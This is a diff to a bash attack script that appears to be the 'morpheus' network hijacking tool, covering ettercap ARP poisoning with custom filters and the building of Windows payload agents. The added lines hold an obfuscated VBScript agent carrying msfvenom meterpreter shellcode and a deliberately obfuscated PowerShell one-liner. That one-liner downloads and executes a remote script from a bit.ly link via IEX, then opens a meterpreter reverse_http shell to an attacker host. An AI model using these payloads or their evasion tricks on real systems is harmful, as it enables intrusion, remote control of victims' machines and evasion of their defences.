@@ -266,13 +266,16 @@ mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
 # revert ettercap conf files to default stage
 if [ -e $Edns ]; then
 mv /tmp/etter.dns $Edns
+echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.dns ${Reset};
 fi
 if [ -e $Econ ]; then
+echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.conf ${Reset};
 mv /tmp/etter.conf $Econ
 fi
 sleep 2
 exit
 }
+
 
 
 
@@ -2130,6 +2133,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
   sleep 1
 
+
     # compiling template.eft to be used in ettercap
     echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
@@ -2142,6 +2146,24 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
       echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
       echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
       sleep 2
+
+      #
+      # execute warn.sh (BEEP) script ?
+      #
+      warnme=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute warn.sh script?\n\nWARNING: your filter must contain\nthe follow rule to trigger BEEP sounds:\nlog(DATA.data, \"./beep-warning.beep\");" --width 290)
+      if [ "$?" -eq "0" ]; then
+        # check if: log(DATA.data, "./beep-warning.beep"); API exists in template ..
+        cfg=`cat $IPATH/filters/template.eft | grep "log(DATA.data, \"./beep-warning.beep\");"`
+        if [ "$?" -eq "0" ]; then
+          xterm -T "MORPHEUS - warn.sh" -geometry 108x24 -e "cd $IPATH/bin && ./warn.sh" &
+        else
+          echo ${RedF}[x]${white} Filter rule:${YellowF}" log(DATA.data, \"./beep-warning.beep\");"${Reset};
+          echo ${RedF}[x] Not found inside Filter, aborting warn.sh execution ..${Reset};
+          sleep 4
+        fi
+      fi
+
+      cd $IPATH/logs
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
@@ -2165,11 +2187,13 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/template.rb $IPATH/filters/template.eft
-  # port-forward
-  # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
+  mv $IPATH/filters/template.rb $IPATH/filters/template.eft
   rm $IPATH/output/template.ef
+  # HINT: warn.sh script will run in backgroud if we dont kill the process ..
+  if [ "$warnme" = "execute warn.sh" ]; then
+    killall warn.sh > dev/null 2>&1
+  fi
   cd $IPATH
 
 else
@@ -2806,11 +2830,14 @@ elif [ "$form" = "Build VBScript agent" ]; then
   sleep 2
   xterm -T "MORPHEUS - BUILD AGENT.vbs" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f psh-cmd -n 20 -o $IPATH/output/chars.raw"
   disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
-  echo "dIm f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"-wINe\"+\"NPo\"&\"WeR1\"+\"no\"+\"PS\"&\"hElL\":f0wBiQ=mId(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" 1 \"&Mid(U1kJi0,1,4)&\" \"&MiD(U1kJi0,12,1)&\" \"&mId(U1kJi0,1,1)&mID(U1kJi0,13,3)&\" \"&MiD(U1kJi0,1,1)&miD(U1kJi0,5,2)&\" \"&\"$disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ+\", 0}\"" > $IPATH/output/agent.vbs
+  echo "dIm f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"/wIN\"+\"eN\"+\"PoWeR\"+\"1\"+\"noP\"+\"ShElL\"+\"noNI\":f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" \"&mId(U1kJi0,1,4)&\" 1 \"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\" \$disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ" > $IPATH/output/agent.vbs
 else
   echo ${BlueF}[☠]${white} Building http agent.ps1 ..${Reset};
   sleep 2
-oneliner="powershell.exe -exec bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode –Payload windows/meterpreter/reverse_http –Lhost $lhost –Lport $lport –Force"
+oneliner="PoWeRsHelL /W\`in 1 /n\`oP /Com\`mand \"0i=(\"{reve'+'rse_ht'+'tp}{wind'+'ows/}{met'+'erpr'+'eter/}\" -f'1','2','0');I\`EX ('({0}w-Obj\`ect {0}t.WebC\`lient).{1}Str\`ing(\"{2}bit'+'.ly/14b'+'ZZ'+'0c\")' -f'Ne','Down'+'load','htt'+'p://');In\`voke-Sh\`ell\`cod\`e –P\`ay\`loa\`d \$0i –Lh\`ost $lhost –Lp\`ort $lport –F\`or\`ce\""
+
+# default ..
+# oneliner="powershell.exe -exec bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode –Payload windows/meterpreter/reverse_http –Lhost $lhost –Lport $lport –Force\""
 fi
 
 
@@ -2867,6 +2894,7 @@ cd $IPATH/output/
 killall python
 rm trigger.bat
 rm chars.raw
+
 
 
 #
